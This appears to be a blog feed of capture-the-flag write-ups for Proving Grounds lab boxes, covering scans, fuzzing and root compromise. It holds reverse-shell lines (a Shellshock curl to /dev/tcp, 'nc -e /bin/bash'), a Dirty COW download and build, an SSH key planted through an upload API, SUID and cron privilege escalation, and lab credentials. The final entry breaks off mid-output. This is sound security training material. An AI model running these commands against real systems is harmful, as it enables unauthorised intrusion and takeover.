[
  
  {
    "title": "Amaterasu",
    "url": "/posts/Proving-Grounds-Amaterasu/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, API, Insecure File Upload, Suid Misconfiguration, Crontab",
    "date": "2024-08-15 00:00:00 -0300",
    





    
    "snippet": "The exploitation of the “Amaterasu” box involved several critical steps. First, intelligence gathering was conducted through a port scan using the nmap tool, identifying open ports such as 21 (FTP)...",
    "content": "The exploitation of the “Amaterasu” box involved several critical steps. First, intelligence gathering was conducted through a port scan using the nmap tool, identifying open ports such as 21 (FTP), 25022 (SSH), 33414 (API), and 40080 (HTTP). Enumeration revealed an FTP server with anonymous login allowed and a Flask-based REST API on port 33414, which permitted directory listing and file uploads. Exploitation was carried out by uploading an SSH public key to the target server, enabling SSH access. During post-exploitation, a scheduled cron job running a backup script was identified, and privilege escalation was achieved using a misconfigured SUID binary (find binary). The process included techniques for exploiting web vulnerabilities, file uploads, and privilege escalation, culminating in total system access.Overviewgraph TD    A[Intelligence Gathering]    A --&gt; B[Port Scan &gt; Ports 21,25022,33414,40080]    B --&gt; C[Enumeration: FTP, HTTP &gt; Flask-based REST API]    C --&gt; D[Exploitation &gt; Insecure File Upload, SSH Access]    D --&gt; E[Post-Exploitation: Privilege Escalation using Suid Misc. and Crontab]    E --&gt; F[Root Shell Access]1. Information GatheringPort Scannmap -sC -sV -p- --open 192.168.197.249 -T5 -vOutputPORT      STATE SERVICE VERSION21/tcp    open  ftp     vsftpd 3.0.3| ftp-syst: |   STAT: | FTP server status:|      Connected to 192.168.45.248|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      At session startup, client count was 3|      vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can't get directory listing: TIMEOUT25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)| ssh-hostkey: |   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)33414/tcp open  unknown| fingerprint-strings: |   GetRequest, HTTPOptions: |     HTTP/1.1 404 NOT FOUND|     Server: Werkzeug/2.2.3 Python/3.9.13|     Date: Tue, 02 Jul 2024 23:24:19 GMT|     Content-Type: text/html; charset=utf-8|     Content-Length: 207|     Connection: close|     &lt;!doctype html&gt;|     &lt;html lang=en&gt;|     &lt;title&gt;404 Not Found&lt;/title&gt;|     &lt;h1&gt;Not Found&lt;/h1&gt;|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;|   Help: |     &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"|     \"http://www.w3.org/TR/html4/strict.dtd\"&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;|     &lt;title&gt;Error response&lt;/title&gt;|     &lt;/head&gt;|     &lt;body&gt;|     &lt;h1&gt;Error response&lt;/h1&gt;|     &lt;p&gt;Error code: 400&lt;/p&gt;|     &lt;p&gt;Message: Bad request syntax ('HELP').&lt;/p&gt;|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;|     &lt;/body&gt;|     &lt;/html&gt;|   RTSPRequest: |     &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"|     \"http://www.w3.org/TR/html4/strict.dtd\"&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;|     &lt;title&gt;Error response&lt;/title&gt;|     &lt;/head&gt;|     &lt;body&gt;|     &lt;h1&gt;Error response&lt;/h1&gt;|     &lt;p&gt;Error code: 400&lt;/p&gt;|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;|     &lt;/body&gt;|_    &lt;/html&gt;40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))| http-methods: |   Supported Methods: GET POST OPTIONS HEAD TRACE|_  Potentially risky methods: TRACE|_http-title: My test page|_http-server-header: Apache/2.4.53 (Fedora)Resume21/tcp    open  ftp     vsftpd 3.0.325022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)33414/tcp open  unknown Server: Werkzeug/2.2.3 Python/3.9.1340080/tcp open  http    Apache httpd 2.4.53 ((Fedora))2. EnumerationPort 21Accepted login with an anonymous user.Port 40080Fuzzing of directories and filesferoxbuster -u http://192.168.197.249:40080 -k -C 404,403,500 --wordlist=/usr/share/wordlists/dirb/big.txt -x php,asp,txt,xml,bakOutput200      GET       41l       73w      495c http://192.168.197.249:40080/styles/style.css200      GET      219l     1187w   100265c http://192.168.197.249:40080/images/firefox-icon.png200      GET       25l      118w     1092c http://192.168.197.249:40080/200      GET      116l      998w     6555c http://192.168.197.249:40080/LICENSE301      GET        7l       20w      244c http://192.168.197.249:40080/images =&gt; http://192.168.197.249:40080/images/301      GET        7l       20w      244c http://192.168.197.249:40080/styles =&gt; http://192.168.197.249:40080/styles/Port 33414Directory ans Files fuzzingferoxbuster -u http://192.168.197.249:33414 -k -C 404,403,500 --wordlist=/usr/share/wordlists/dirb/big.txt -x php,asp,txt,xml,bakOutput200      GET        1l       19w      137c http://192.168.197.249:33414/help200      GET        1l       14w       98c http://192.168.197.249:33414/infoWeb server serving a REST API available at http://192.168.197.249:33414/infoEndpointhttp://192.168.197.249:33414/helpUsing /info and /help, we can list the directory and upload a file.Burp intercept (Repeater module)3. ExploitationInsecure File UploadI will upload my SSH private key to /file-upload.First, I will generate the key.ssh-keygen -t rsacd /home/0xfl0k1/.sshsudo chmod 600 id_rsa #this is what I will use to log insudo cp id_rsa.pub id_rsa.txt #this is what I will send to the server.Poc (file lista.txt)curl -X POST -F 'file=@/tmp/lista.txt' -F filename=\"/home/alfredo/lista.txt\" http://192.168.197.249:33414/file-upload ViewSend the key to the server.curl -i -L -X POST -H \"Content-Type: multipart/form-data\" -F file=\"@/tmp/id_rsa.txt\" -F filename=\"/home/alfredo/.ssh/authorized_keys\" http://192.168.197.249:33414/file-uploadInitial AccessLogin with SSH private keysudo ssh -oHostKeyAlgorithms=+ssh-dss alfredo@192.168.197.249 -p 25022 -i /home/0xfl0k1/.ssh/id_rsa4. Post-ExploitationThere is a backup-flask.sh task running every minute.cat /etc/crontab cat /usr/local/bin/backup-flas.shbackup-flask.sh#!/bin/shexport PATH=\"/home/alfredo/restapi:$PATH\"cd /home/alfredo/restapitar czf /tmp/flask.tar.gz *The script exports /home/alfredo/restapi to the PATH and then compresses the file contents using tar.Privilege Escalation  Find (with SUID) will be used to escalate privileges.  I will use the command /usr/bin/find and save it in a ‘tar’ file.nano tarchmod +x tartar#!/bin/bash chmod u+s /usr/bin/find #because the where is the \"find\"Search for SUID binaries.find / -perm -u=s -type f 2&gt;/dev/null[find        |                GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid)/usr/bin/find . -exec /bin/sh -p \\; -quitRoot Access"
  },
  
  {
    "title": "Sumo",
    "url": "/posts/Proving-Grounds-Play-Sumo/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, Shellshock, Dirty Cow",
    "date": "2024-08-15 00:00:00 -0300",
    





    
    "snippet": "The exploitation of the “Sumo” box involved several critical steps. First, intelligence gathering was conducted through a port scan using the nmap tool, identifying open ports such as 22 and 80. En...",
    "content": "The exploitation of the “Sumo” box involved several critical steps. First, intelligence gathering was conducted through a port scan using the nmap tool, identifying open ports such as 22 and 80. Enumeration revealed a potential vulnerability in the /cgi-bin directory, specifically the Shellshock vulnerability (CVE-2014-6271). Using the nikto tool, the Shellshock vulnerability was confirmed, allowing for remote command execution. The initial access was gained by exploiting this vulnerability through a crafted User-Agent header in a curl command. During post-exploitation, a vulnerable Linux kernel version was identified, and privilege escalation was achieved by using the Dirty COW exploit, leading to root access. The process included techniques for exploiting web vulnerabilities, remote command execution, and privilege escalation, culminating in total system access and the retrieval of proof files.Overviewgraph TD    A[Intelligence Gathering]    A --&gt; B[Port Scan &gt; Port 22,80]    B --&gt; C[Enumeration: HTTP &gt; Shellshock]    C --&gt; D[Exploitation &gt; Shellshock Exploit]    D --&gt; E[Post-Exploitation: Privilege Escalation using Dirty COW]    E --&gt; F[Root Shell Access]1. Information GatheringPort Scansudo nmap -sC -sV -p- 192.168.197.87 -T5 -vOutputPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)|   2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)|_  256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))| http-methods: |_  Supported Methods: OPTIONS GET HEAD POST|_http-server-header: Apache/2.2.22 (Ubuntu)|_http-title: Site doesn't have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel2. EnumerationPort 80Identified the Shellshock vulnerability using the nikto tool.nikto -h http://192.168.244.87Output+ /cgi-bin/test: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271+ /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271  Review          The cgi-bin directory was found to have a vulnerability called ShellShock.      Shellshock allows an attacker to execute arbitrary commands remotely on the affected system by exploiting a flaw in how Bash processes environment variables. Specifically, Bash allowed an attacker to insert malicious code as part of the value of an environment variable, which was interpreted and executed by Bash without restrictions. Exploiting this vulnerability, the page can generate an error.      The “cgi-bin” directory is related to Shellshock because many CGI (Common Gateway Interface) scripts are executed in this directory. Shellshock primarily affected web servers that used CGI scripts written in Bash.      You can find this vulnerability by noting that you are using an old version of Apache and cgi_mod (with the cgi folder) or by using nikto.      3. ExploitationInitial Accesscurl -H 'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.45.248/666 0&gt;&amp;1' http://192.168.244.87/cgi-bin/test4. Post-ExploitationKernel Vulnerabilityuname -a   Linux ubuntu 3.2.0-23-genericExploit suggester on the targetI encountered a problemExport $PATHPATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATHnow, it worked perfectly gcc -pthread 40839.c -o dirtycow -lcrypt ./dirtycowRoot Access"
  },
  
  {
    "title": "Monitoring",
    "url": "/posts/Proving-Grounds-Play-Monitoring/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, Nagios",
    "date": "2024-08-15 00:00:00 -0300",
    





    
    "snippet": "The exploitation of the “Monitoring” box involved several critical steps. First, information gathering was conducted through a port scan using the nmap tool, identifying open ports such as 22, 25, ...",
    "content": "The exploitation of the “Monitoring” box involved several critical steps. First, information gathering was conducted through a port scan using the nmap tool, identifying open ports such as 22, 25, 80, 389, 443, and 5667. During enumeration, vulnerable services were discovered, including the Nagios server.Using the CVE-2020-15903 exploit, initial access was gained with the default credentials “nagiosadmin” and “admin”. A reverse shell was established, providing remote access to the system.During post-exploitation, it was identified that the “/usr/bin/php” binary could be executed with sudo privileges. An exploit in PHP was found, but due to dependencies, Metasploit was used to escalate privileges, ultimately gaining root access.The process included techniques for exploiting web service vulnerabilities, remote command execution, and privilege escalation, culminating in total system access and the retrieval of proof files.Overviewgraph TD    A[Intelligence Gathering]    A --&gt; B[Port Scan &gt; Port 22,25,80,389,443,5667]    B --&gt; C[Enumeration: HTTP &gt; Nagios]    C --&gt; D[Exploitation &gt; Nagios Exploit, Initial Access]    D --&gt; E[Root Shell through Metasploit]1. Intelligence GatheringPort Scan sudo nmap -Pn -sV -p- --open 192.168.190.136PORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)25/tcp   open  smtp       Postfix smtpd80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))5667/tcp open  tcpwrappedService Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel2. EnumerationPort 25User enumeration with smtp-user-enum toolsmtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 192.168.190.136----------------------------------------------------------|                   Scan Information                       | ----------------------------------------------------------Mode ..................... VRFYWorker Processes ......... 5Usernames file ........... /usr/share/wordlists/seclists/Usernames/Names/names.txtTarget count ............. 1Username count ........... 10177Target TCP port .......... 25Query timeout ............ 5 secsTarget domain ............ ######## Scan started at Wed Jun 19 15:25:04 2024 #########192.168.190.136: bin exists192.168.190.136: irc exists192.168.190.136: mail exists192.168.190.136: man exists192.168.190.136: root exists192.168.190.136: sys exists######## Scan completed at Wed Jun 19 15:43:27 2024 #########6 results.10177 queries in 1103 seconds (9.2 queries / sec)Port 389nmap -Pn -sT -Pn --open -p389 --script=ldap-rootdse.nse 192.168.236.136 -nPORT    STATE SERVICE389/tcp open  ldap| ldap-rootdse: | LDAP Results|   &lt;ROOT&gt;|       namingContexts: dc=nodomain|       supportedControl: 2.16.840.1.113730.3.4.18|       supportedControl: 2.16.840.1.113730.3.4.2|       supportedControl: 1.3.6.1.4.1.4203.1.10.1|       supportedControl: 1.3.6.1.1.22|       supportedControl: 1.2.840.113556.1.4.319|       supportedControl: 1.2.826.0.1.3344810.2.3|       supportedControl: 1.3.6.1.1.13.2|       supportedControl: 1.3.6.1.1.13.1|       supportedControl: 1.3.6.1.1.12|       supportedExtension: 1.3.6.1.4.1.4203.1.11.1|       supportedExtension: 1.3.6.1.4.1.4203.1.11.3|       supportedExtension: 1.3.6.1.1.8|       supportedLDAPVersion: 3|       supportedSASLMechanisms: DIGEST-MD5|       supportedSASLMechanisms: NTLM|       supportedSASLMechanisms: CRAM-MD5|_      subschemaSubentry: cn=SubschemaPort 80searched for the exploit for Nagios XL but didn’t find onelogin pagesearched for the default credentials -u “nagiosadmin” -p “admin”Redirected to port 443Port 4433. ExploitationTo gain initial access, the exploit from https://www.exploit-db.com/exploits/49422 was used.python3 [49422.py](http://49422.py/) [https://192.168.236.136](https://192.168.236.136/) nagiosadmin admin 192.168.45.195 666Initial AccessWith this exploit, I was unable to escalate privileges. However, I could execute “/usr/bin/php” with sudo. I found an exploit in PHP, but it had many dependencies, so I used Metasploit instead.Root Access"
  },
  
  {
    "title": "Lampião",
    "url": "/posts/Proving-Grounds-Play-Lampiao/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, Drupal, Dirty Cow",
    "date": "2024-08-15 00:00:00 -0300",
    





    
    "snippet": "The exploitation of the “Lampião” box involved several critical steps. First, information gathering was conducted through a port scan using the nmap tool, identifying open ports such as 22, 80, and...",
    "content": "The exploitation of the “Lampião” box involved several critical steps. First, information gathering was conducted through a port scan using the nmap tool, identifying open ports such as 22, 80, and 1898. The enumeration revealed a Drupal CMS running on port 1898, specifically version 7.54. Using droopescan, several plugins and themes were identified, along with potential vulnerabilities. Initial access was gained by exploiting the Drupal CMS using Metasploit. During post-exploitation, a sensitive file was discovered, providing SSH access with the password “Virgulino”. Privilege escalation was achieved by exploiting the Linux kernel vulnerability with the Dirt Cow exploit, allowing root access. The process included techniques for exploiting web service vulnerabilities, remote command execution, and privilege escalation, culminating in full system access and retrieval of evidence files.Overviewgraph TD    A[Intelligence Gathering]    A --&gt; B[Port Scan &gt; Port 22,80,1898]    B --&gt; C[Enumeration: HTTP &gt; Drupal CMS]    C --&gt; D[Exploitation &gt; Drupal Exploit]    D --&gt; E[Post-Exploitation: Privilege Escalation using Dirty Cow]    E --&gt; F[Root Shell Access]1. Information GatheringPort Scannmap -Pn -sV -sC -p- --open 192.168.236.48 -vOutputPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)80/tcp   open  http?| fingerprint-strings: |   HTTPOptions: |     _____ _ _ |     |_|/ ___ ___ __ _ ___ _ _ |     \\x20| __/ (_| __ \\x20|_| |_ |     ___/ __| |___/ ___|__,_|___/__, ( ) |     |___/ |     ______ _ _ _ |     ___(_) | | | ||     \\x20/ _` | / _ / _` | | | |/ _` | ||_    __,_|__,_|_| |_|1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-generator: Drupal 7 (http://drupal.org)|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Lampi\\xC3\\xA3o| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC032. EnumerationPort 1898It is running a Drupal CMS.droopscan tooldroopescan scan drupal -u [http://192.168.236.48:1898](http://192.168.236.48:1898/)[+] Plugins found:                                                                  profile http://192.168.236.48:1898/modules/profile/    php http://192.168.236.48:1898/modules/php/    image http://192.168.236.48:1898/modules/image/[+] Themes found:    seven http://192.168.236.48:1898/themes/seven/    garland http://192.168.236.48:1898/themes/garland/[+] Possible version(s):    7.54[+] Possible interesting urls found:    Default changelog file - http://192.168.236.48:1898/CHANGELOG.txt[+] Scan finished (0:02:54.053721 elapsed)Version: 7.54search for exploit in Metasploit3. ExploitationInitial Access4. Post-ExploitationFor privilege escalation, the file “/var/www/html/sites/default/settings.php” was found.access to SSH protocol with password “Virgulino”vulnerable kerneluname -aExploit Dirty Cow:Linux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW /proc/self/mem’ Race Condition Privilege Escalation (/etc/passwd Method)new password for root: “dirtyConFun”Root Access"
  },
  
  {
    "title": "Empire-Breakout",
    "url": "/posts/Proving-Grounds-Play-Empire/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, SMB, Webmin, Brainfuck, Capabilities",
    "date": "2024-08-15 00:00:00 -0300",
    





    
    "snippet": "The exploration of the “Empire-breakout” box involved several critical steps. First, information gathering was carried out through a port scan using the nmap tool, identifying open ports such as 80...",
    "content": "The exploration of the “Empire-breakout” box involved several critical steps. First, information gathering was carried out through a port scan using the nmap tool, identifying open ports such as 80, 445, 139, 10000, and 20000. During enumeration, sensitive information was discovered, including an encrypted string in Brainfuck, which was decoded to obtain initial access credentials.With the credentials “cyber” and “.2uqPEfj3D&lt;P’a-3”, initial access to Webmin was obtained. Using the Webmin console, a reverse shell was established, allowing remote access to the system.During post-exploitation, a “tar” binary with elevated capabilities was identified, allowing the reading of files with any permission. This led to the discovery of a backup file containing an old password, which was used to gain root access to the system.The process included techniques to exploit vulnerabilities in web services, remote command execution, and privilege escalation, culminating in full system access and the retrieval of proof files.Overviewgraph TD    A[Intelligence Gathering]    A --&gt; B[Port Scan &gt; Port 80,445,139,10000,20000]    B --&gt; C[Enumeration: HTTP &gt; Brainfuck Encryption]    C --&gt; D[Exploitation &gt; WebMin, Admin Access]    D --&gt; E[Post-Exploitation: Privilege Escalation through Capabilities]    E --&gt; F[Root Shell Access]1. Intelligence GatheringPort Scansudo nmap -sS -T1 -Pn -p- --open 192.168.190.238 -v2. EnumerationPorta 80When verifying the page source, I found an encrypted access string (brainfuck).++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.A search on Google led to a decoder site:https://www.dcode.fr/brainfuck-language  .2uqPEfj3D&lt;P’a-3Port 445 and 139The user credentials ‘cyber’ were previously found using the enum4linux -a 192.168.190.238 commandPort 10000  MiniServ/1.981Webmin version MiniServ/1.981 was found. After searching for exploits, none were found.Port 20000  MiniServ/1.830Webmin version MiniServ/1.830 was found. After searching for exploits, none were found.3. ExploitationInitial AccessWith the credentials “cyber” and “.2uqPEfj3D&lt;P’a-3”, I gained initial access.Accessing the console mode of Webmin, I sent /bin/bashnc -e /bin/bash 192.168.45.163 666Listening on the local machine:rlwrap -cAr nc -nlvp 666Importing the shell using Python:python3 -c 'import pty;pty.spawn(\"/bin/bash\")'4. Post-ExploitationI found the binary “tar” with capabilities:getcap -r / 2&gt;/dev/nullCAP_DAC_READ_SEARCH - This means it can read all files on the system regardless of their permissions.I found the file “.old_pass.bak” in /var/backupsThe goal was to compress the file with “tar” to discover the old password../tar -cf pass.tar /var/backups/.old_pass.bak./tar -xf pass.tarcat var/backups/.old_pass.bakAccess the root"
  },
  
  {
    "title": "DriftingBlues6",
    "url": "/posts/Proving-Grounds-Play-Drift/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, TextPattern, Insecure File Upload, Dirty Cow",
    "date": "2024-08-15 00:00:00 -0300",
    





    
    "snippet": "The exploitation of the “DriftingBlues6” box involved several critical steps. First, intelligence gathering was conducted through a port scan using the nmap tool, identifying open ports such as 80....",
    "content": "The exploitation of the “DriftingBlues6” box involved several critical steps. First, intelligence gathering was conducted through a port scan using the nmap tool, identifying open ports such as 80. Enumeration revealed the presence of a Textpattern CMS. Through directory fuzzing and a file search, a zip file named “spammer.zip” was found. After cracking the zip password, credentials were extracted, which provided access to the Textpattern admin panel. A malicious file was then uploaded, leading to remote command execution. During post-exploitation, a vulnerable Linux kernel version was identified, and privilege escalation was achieved by using the Dirty Cow exploit, leading to root access. The process included techniques for exploiting web vulnerabilities, file uploads, and privilege escalation, culminating in total system access and the retrieval of proof files.Overviewgraph TD    A[Intelligence Gathering]    A --&gt; B[Port Scan &gt; Port 80]    B --&gt; C[Enumeration: HTTP &gt; Textpattern CMS]    C --&gt; D[Exploitation &gt; Zip File Cracking &gt; Insecure File Upload]    D --&gt; E[Post-Exploitation: Privilege Escalation using Dirty Cow]    E --&gt; F[Root Shell Access]1. Information GatheringPort Scansudo nmap -sC -sV -p-  192.168.169.219 -T5 -vOutputPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.2.22 ((Debian))| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 1 disallowed entry |_/textpattern/textpattern|_http-title: driftingblues|_http-server-header: Apache/2.2.22 (Debian)2. EnumerationPort 80Source Page&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;title&gt;driftingblues&lt;/title&gt;&lt;body class=\"gbody\"&gt;&lt;style&gt;.gbody {\tbackground-color: #f4ecd8;\twidth: 1000px;\tmargin: 40px auto;\tfont-family: arial;\tfont-size: 20px;\t   }.gempty1 {\tdisplay: inline-block;\twidth: 1000px;\theight: 10px;\tborder-bottom: solid 1px #000000;\t}.gempty {\tdisplay: inline-block;\twidth: 1000px;\theight: 70px;\t}\t&lt;/style&gt;&lt;span class=\"main1\"&gt;&lt;h1&gt;Drifting Blues Tech&lt;h2&gt;please don't hack&lt;h2&gt;enough is enough!!!&lt;br&gt;&lt;br&gt;&lt;img src=\"db.png\"&gt;&lt;/span&gt;&lt;span class=\"gempty\"&gt;&lt;/span&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- please hack vvmlist.github.io insteadhe and their army always hacking us --&gt;directory fuzzinggobuster dir -u http://192.168.169.219 -w /usr/share/wordlists/dirb/big.txt -t 40===============================================================Starting gobuster in directory enumeration mode===============================================================/.htpasswd            (Status: 403) [Size: 292]/.htaccess            (Status: 403) [Size: 292]/cgi-bin/             (Status: 403) [Size: 291]/db                   (Status: 200) [Size: 53656]/index                (Status: 200) [Size: 750]/robots               (Status: 200) [Size: 110]/robots.txt           (Status: 200) [Size: 110]/server-status        (Status: 403) [Size: 296]/textpattern          (Status: 301) [Size: 324] [--&gt; http://192.168.169.219/textpattern/]Progress: 20469 / 20470 (100.00%)robots.txtDiscovered the Textpattern CMShttp://192.168.169.219/textpattern/textpattern/ //requesting username and password for the admin pagesearch for files with a .zip extensionferoxbuster -u http://192.168.169.219/ -k -C 404,403,500 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x zip200      GET      212l     1206w    97264c http://192.168.169.219/db.png200      GET       76l       75w      750c http://192.168.169.219/index200      GET       76l       75w      750c http://192.168.169.219/200      GET      212l     1206w    97264c http://192.168.169.219/db200      GET        5l       14w      110c http://192.168.169.219/robots200      GET        2l        7w      227c http://192.168.169.219/spammer200      GET        2l        7w      227c http://192.168.169.219/spammer.zipspammer.zipzip file requests passwordCrack the hash using the John toolzip2john spammer.zip &gt; hash                                  hashspammer.zip/creds.txt:$pkzip$1*1*2*0*1b*f*b003611d*0*27*0*1b*b003*2d41804a5ea9a60b1769d045bfb94c71382b2e5febf63bda08a56c*$/pkzip$:creds.txt:spammer.zip::spammer.zipcrackjohn hash   myspace4         (spammer.zip/creds.txt)Credentials  mayer:lionheart3. ExploitationAccess the admin panelUpload fileCreate the malicious file and set my IP.http://192.168.169.219/textpattern/textpattern/index.php?event=fileAccessed the file at http://192.168.169.219/textpattern/files/Initial Access4. Post-ExploitationKernel Vulnerabilityuname -a  Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/LinuxLinux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW’ ‘PTRACE_POKEDATA’ Race Condition Privilege Escalation (/etc/passwd Method)wget http://192.168.45.248/40839.cgcc -pthread 40839.c -o dirtycow -lcryptRoot Access"
  },
  
  {
    "title": "Blogger",
    "url": "/posts/Proving-Grounds-Play-Blogger/",
    "categories": "CTF, Proving Grounds - Play",
    "tags": "EASY, Linux, Web, Wordpress, Insecure File Upload, Sudo Misconfiguration",
    "date": "2024-08-15 00:00:00 -0300",
    





    
    "snippet": "The exploitation of the “Blogger” box involved several critical steps. First, intelligence gathering was conducted through a port scan using the nmap tool, identifying open ports such as 22 and 80....",
    "content": "The exploitation of the “Blogger” box involved several critical steps. First, intelligence gathering was conducted through a port scan using the nmap tool, identifying open ports such as 22 and 80. Enumeration revealed a website running on Apache, which redirected to a Blogger domain. Using WPScan, users and vulnerable plugins were identified, including outdated versions of Akismet and wpDiscuz. Exploitation was carried out through an insecure file upload vulnerability, allowing for remote code execution. During post-exploitation, lateral movement to the vagrant user was achieved using the password “vagrant,” and privilege escalation to root was completed using sudo misconfiguration. The process included web vulnerability exploitation, file uploads, and privilege escalation, leading to full system access.Overviewgraph TD    A[Intelligence Gathering]    A --&gt; B[Port Scan &gt; Port 22,80]    B --&gt; C[Enumeration: HTTP &gt; WordPress CMS]    C --&gt; D[Exploitation &gt; Insecure File Upload]    D --&gt; E[Post-Exploitation: Privilege Escalation &gt; Sudo Misconfiguration]    E --&gt; F[Root Shell Access]1. Information GatheringPort Scansudo nmap -sC -sV -p- 192.168.192.217 -T5 -v OutputPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 95:1d:82:8f:5e:de:9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA)|   256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA)|_  256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Blogger | HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel2. EnumerationPort 22Not authenticated with username and passwordPort 80Fuzzing of directories and filesferoxbuster -u http://192.168.192.217 -k -C 404,403,500  --wordlist=/usr/share/wordlists/dirb/big.txt -x php,asp,txt,xml,bak[####################] - 6m    122814/122814  362/s   http://192.168.192.217/ [####################] - 2s    122814/122814  77730/s http://192.168.192.217/css/ =&gt; Directory listing[####################] - 1s    122814/122814  103466/s http://192.168.192.217/js/ =&gt; Directory listing[####################] - 5s    122814/122814  25666/s http://192.168.192.217/images/ =&gt; Directory listing[####################] - 0s    122814/122814  449868/s http://192.168.192.217/assets/ =&gt; Directory listing[####################] - 2s    122814/122814  54779/s http://192.168.192.217/assets/css/ =&gt; Directory listing[####################] - 3s    122814/122814  39200/s http://192.168.192.217/assets/fonts/ =&gt; Directory listing[####################] - 3s    122814/122814  38476/s http://192.168.192.217/assets/images/ =&gt; Directory listing[####################] - 1s    122814/122814  115210/s 